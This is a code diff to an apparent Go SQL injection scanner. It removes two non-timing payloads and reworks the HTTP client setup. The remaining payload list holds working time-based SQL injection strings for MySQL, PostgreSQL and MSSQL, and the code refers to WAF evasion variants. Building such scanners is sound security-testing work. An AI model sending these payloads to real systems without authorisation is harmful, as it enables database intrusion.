@@ -58,7 +58,6 @@ var payloads = []payload{
 	// MySQL — OR-based (catches cases where id=1 doesn't match)
 	{name: "mysql-sleep-quote", dbType: "mysql", prefix: "' OR SLEEP(", sleepFn: "%d", suffix: ")-- -"},
 	{name: "mysql-sleep-num", dbType: "mysql", prefix: "1 OR SLEEP(", sleepFn: "%d", suffix: ")-- -"},
-	{name: "mysql-benchmark", dbType: "mysql", prefix: "' OR BENCHMARK(10000000,SHA1('", sleepFn: "test", suffix: "'))-- -"},
 
 	// PostgreSQL
 	{name: "pg-sleep-quote", dbType: "postgres", prefix: "'; SELECT pg_sleep(", sleepFn: "%d", suffix: ");-- -"},
@@ -67,9 +66,6 @@ var payloads = []payload{
 	// MSSQL
 	{name: "mssql-waitfor-quote", dbType: "mssql", prefix: "'; WAITFOR DELAY '0:0:", sleepFn: "%d", suffix: "'-- -"},
 	{name: "mssql-waitfor-num", dbType: "mssql", prefix: "1; WAITFOR DELAY '0:0:", sleepFn: "%d", suffix: "'-- -"},
-
-	// SQLite
-	{name: "sqlite-like-glob", dbType: "sqlite", prefix: "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(", sleepFn: "500000000", suffix: "))))-- -"},
 }
 
 // Paths and parameters commonly vulnerable to SQLi.
@@ -98,13 +94,17 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 		return nil, nil
 	}
 
-	client := authctx.HTTPClient(ctx)
-	client = &http.Client{
-		Timeout: 30 * time.Second,
-		Transport: &http.Transport{
+	ac := authctx.HTTPClient(ctx)
+	transport := ac.Transport
+	if transport == nil {
+		transport = &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
-		},
-		Jar: client.Jar,
+		}
+	}
+	client := &http.Client{
+		Timeout:   30 * time.Second,
+		Transport: transport,
+		Jar:       ac.Jar,
 	}
 
 	// Determine working scheme
@@ -137,11 +137,6 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 			for _, p := range payloads {
 				if ctx.Err() != nil {
 					break
-				}
-
-				// Skip non-timing payloads for the dual-sleep check
-				if p.sleepFn == "test" || p.sleepFn == "500000000" {
-					continue
 				}
 
 				// First probe: SLEEP(3) — try original + WAF evasion variants.
